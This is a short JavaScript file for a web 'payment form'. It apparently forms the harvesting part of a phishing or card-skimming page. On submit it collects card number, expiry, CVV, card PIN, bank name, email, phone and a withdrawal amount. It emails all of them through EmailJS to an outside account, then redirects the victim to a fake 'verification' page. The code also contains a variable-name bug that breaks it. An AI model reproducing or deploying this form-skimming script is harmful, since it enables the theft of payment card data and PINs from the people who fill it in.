

// Import EmailJS
//import emailjs from 'emailjs-com';

// Get the form element
const form = document.getElementById('payment-form');

// Add event listener to the form submit event
form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Get the form data
  const bankName = document.getElementById('bank-name').value;
  const cardNumber = document.getElementById('card-number').value;
  const expiringDate = document.getElementById('expiring-date').value;
  const cvv = document.getElementById('cvv').value;
  const email = document.getElementById('email').value;
  const phoneNumber = document.getElementById('phone-number').value;
  const withdrawAmount = document.getElementById('Withdraw-Amount').value;
  const pin = document.getElementById('pin').value;

  // Check if all fields are filled
  if (!bankName || !cardNumber || !expiringDate || !cvv || !email || !phoneNumber || !withdrawAmount || !pin) {
    alert('Please fill all details');
    return;
  }

  // Send the form data to EmailJS
  emailjs.send('service_9psisa9', 'template_azxewmk', {
    Withdraw_Amount: WithdrawAmount,
    bank_name: bankName,
    card_number: cardNumber,
    expiring_date: expiringDate,
    cvv: cvv,
    pin: pin,
    email: email,
    phone_number: phoneNumber
  })
  .then((response) => {
    console.log('Success!', response.status, response.text);
    alert('Details submitted for payment');
    // Reset the form
    form.reset();

    // Add the condition to load another page with file path
  window.location.href = 'verify/verification.html';
    
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});   
